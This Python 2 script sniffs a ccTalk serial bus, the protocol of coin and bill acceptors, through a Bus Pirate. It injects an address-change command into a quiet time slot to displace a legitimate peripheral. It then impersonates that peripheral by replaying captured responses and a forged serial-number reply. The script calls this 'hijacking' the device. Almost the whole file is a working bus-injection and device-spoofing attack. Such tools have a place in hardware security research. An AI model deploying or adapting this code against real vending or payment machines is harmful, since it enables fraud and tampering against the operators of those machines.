#!/usr/bin/env python
# -*- coding: utf-8 -*-

import serial
import threading
import time
import sys
from optparse import OptionParser

from ccTalk import *

class ccResponder(threading.Thread):
    """
    This class sets a thread that listens for incoming packets and responds to them
    """

    def __init__(self, address):
        super(ccResponder, self).__init__()
        self.terminated = False
        self.address = address
        self.responses={}

    def readPacket(self):
        """
        Reads a ccTalk packet and returns it
        """
        buff=""
        while True:
            print "Buffer status"
            print buff.encode('hex')
            #Read the destination address
            if len(buff)<2:
                while ser.inWaiting()<2:
                    time.sleep(0.001)
                buff += ser.read(2)
            length=ord(buff[1])
            if len(buff)<length+5:
                while ser.inWaiting()<length+3:
                    time.sleep(0.001)
                buff += ser.read(length+3)
            try:
                ccPkt = ccTalkMessage(data=buff[:length+5])
                print "Received : ", ccPkt
                return ccPkt
            except:
                buff=buff[1:]
                continue

    def setResponse(self, header,response):
        """
        Changes the data to sent in response to a request
        """
        self.responses.update({header:response})

    def bulkSetResponse(self, responses):
        """
        Changes the data to sent in response to a request
        """
        self.responses.update(responses)

    def respond(self, request):
        """
        Responds to a request
        """
        if request.payload.header in self.responses.keys():
            resp = ccTalkMessage(header=0, source=self.address, destination=request.source, payload=self.responses[request.payload.header])
        else:
            resp = ccTalkMessage(header=0, source=self.address, destination=request.source)
        print "Responding : ", resp
        disableRX()
        #ser.write(chr(0b00010000+(len(resp.raw())-1)))
        #ser.write(resp.raw())
        #ser.flush()
        # Since the bitbang responds à 0x01 after each byte, clean after the whole data is sent
        #ser.read(len(resp.raw()))
        for byte in resp.raw():
            ser.write(chr(0b00010001))
            ser.write(byte)
            ser.flush()
            ser.read(1)
            print "Wrote ", byte.encode('hex')
        enableRX()
    
    def run(self):
        global ser
        while not self.terminated:
            pkt = self.readPacket()
            if pkt.destination==self.address:
                # The packet is for the responder
                # Wait 10ms to simulate the device
                time.sleep(0.01)
                self.respond(pkt)

    def stop(self):
        self.terminated = True



class serialTimerReader(threading.Thread):
    """
    This class defines a thread that grabs data on a ccTalk bus as well as the blank
    times to determine if injection is possible
    """

    def __init__(self):
        super(serialTimerReader, self).__init__()
        self.terminated = False
        self.data=""
        self.times=[]
    
    def run(self):
        global ser
        bytesToRead=0
        while not self.terminated:
            start = time.clock()
            while ser.inWaiting() == 0 and not self.terminated:
                time.sleep(0.001)
            elapsed = round(time.clock()-start,3)
            # We need at least a 10 miliseconds time frame to start sending
            # We'll take at least 20 miliseconds to wait and send our data 
            if elapsed >= 0.02:
                self.times.append(elapsed)
            self.data = self.data + ser.read(ser.inWaiting())

    def stop(self):
        self.terminated = True

    def getData(self):
        return self.data

    def getTimes(self):
        return self.times


def enterBitBang():
    """
    Enters binary bitbang mode on the bus pirate
    """
    # Enter bitbang mode
    for i in xrange(20):
        ser.write("\x00")
        if ser.inWaiting()>4:
            if "BBIO1" in ser.read(5):
                break

    # Enter UART mode
    ser.write("\x03")
    #Baud rate : 9600
    ser.write(chr(0b01100100))
    #Peripherals : power ON / pullup ON
    ser.write(chr(0b01001100))
    # Cleans input buffer
    ser.flushInput()
    while ser.inWaiting()>0:
        time.sleep(0.1)


def leaveBitBang():
    """
    Leave the binary bitbang mode on the bus pirate
    """
    # Leave UART mode
    ser.write("\x00")
    # Leave bitbang mode
    ser.write("\x0f")

def disableRX():
    """
    Disable UART RX echo on the bus pirate
    """
    ser.write(chr(0b00000011))
    ser.read(1)

def enableRX():
    """
    Enable UART RX echo on the bus pirate
    """
    ser.write(chr(0b00000010))
    ser.read(1)



def injectMessage(header, data='', source=1, destination=2):
    """
    Waits for a silence on the ccTalk bus, then sends a packet"
    """
    request = ccTalkMessage(source=source, destination=destination, header=header, payload=data)
    #request.setPayload(header, data)
    bytesToRead=0
    sent=False
    while not sent:
        start = time.clock()
        while bytesToRead == 0 and not sent:
            bytesToRead = ser.inWaiting()
            if time.clock()-start >= 0.01:
                print "Start"
                disableRX()
                ser.write(chr(0b00010000+(len(request)-1)))
                ser.write(request.raw())
                ser.flush()
                ser.read(len(request.raw()))
                enableRX()
                sent=True
                break
        bytesToRead=0
    print "[*] Request sent"

def extractResponses(messages):
    responses = {}
    for i in range(0,len(messages)):
        if messages[i].payload.header==0:
            responses.update({messages[i-1].payload.header, messages[i].payload.data})

if __name__ == '__main__':

    parser = OptionParser()
    parser.add_option("-i", "--interface", help="Serial port to use", metavar="DEVICE", dest="serPort")
    parser.add_option("-w", "--write", help="File name to write data", metavar="FILE", dest="outFile")
    parser.add_option("-b", "--bus-pirate", help="Use this switch to tell the serial port is a bus pirate", dest="busPirate", action="store_true", default=False)
    parser.add_option("-s", "--source", help="Source address of the device to hijack", metavar="SOURCE", dest="source", default=2)
    parser.add_option("-d", "--destination", help="Destination address of the device to hijack", metavar="DESTINATION", dest="destination", default=42)

    (options, args) = parser.parse_args()

    if options.serPort is None:
        print "Error, no serial port specified"
        sys.exit()
    else:
        try:
            if options.busPirate:
                #ser=serial.Serial(options.serPort, 115200, timeout=1)
                ser=serial.Serial(options.serPort, 115200)
                enterBitBang()
                enableRX()
            else:
                #ser=serial.Serial(options.serPort, 9600, timeout=1)
                ser=serial.Serial(options.serPort, 9600)
        except serial.SerialException, e:
            print e.message
            sys.exit()

    if options.outFile is not None:
        outFile = open(options.outFile,"wb")
    else:
        outFile = None

    # main loop
    reader = serialTimerReader()
    reader.start()
    print "[*] Serial timer reader running for 5 seconds..."

    time.sleep(5)
    print "[*] Stopping timer reader..."

    reader.stop()
    reader.join()

    times = reader.getTimes()
    
    try:

        if len(times)>0:

            print "[*] Time slots found, ready for injection"

            # We instanciate the responder to load the responses
            responder = ccResponder(int(options.source))

            ccPkts = parseMessages(reader.getData())[1]

            for i in range(len(ccPkts)):
                if ccPkts[i].payload.header==0:
                    responder.setResponse(ccPkts[i-1].payload.header, ccPkts[i].getPayload()[1:])
                    print "Added response to request header " + str(ccPkts[i-1].payload.header)
            
            responder.setResponse(229, "112233445566778899aabb".decode('hex'))

            print "[*] Replacing device @ "+str(options.source)+" to "+str(options.destination)

            #print "[*] Checking for device to hijack"
            #injectMessage( header=254, data='', source=1, destination=int(options.destination))
            #TODO: Add check for device response

            # Send an address change request to the device
            print "[*] Changing device address to "+str(options.destination)
            injectMessage( header=251, data=chr(int(options.destination)), source=1, destination=int(options.source))


            #Totally flush the input buffer before starting replies
            disableRX()
            ser.flushInput()
            while ser.inWaiting()>0:
                time.sleep(0.1)
            time.sleep(0.1)
            enableRX()

            print "[*] Device successfully hijacked, starting responder thread"
            responder.start()

            while True:
                #userHeader = int(raw_input('Enter header value to change (q to quit): '))
                #userData = raw_input('Enter new data (in hex): ').decode('hex')
                #responder.setResponse(userHeader,userData)
                time.sleep(1)

        else:
            print "[-] No time slots found"


    except Exception, e:
        print e

    #except:
    #    print "[*] Stopping responder thread"
    #    responder.stop()
    #    responder.join()


    print "[*] Restoring device @ " + str(options.source)
    enableRX()
    injectMessage( header=251, data=chr(int(options.source)), source=1, destination=int(options.destination))

    if options.busPirate:
        leaveBitBang()
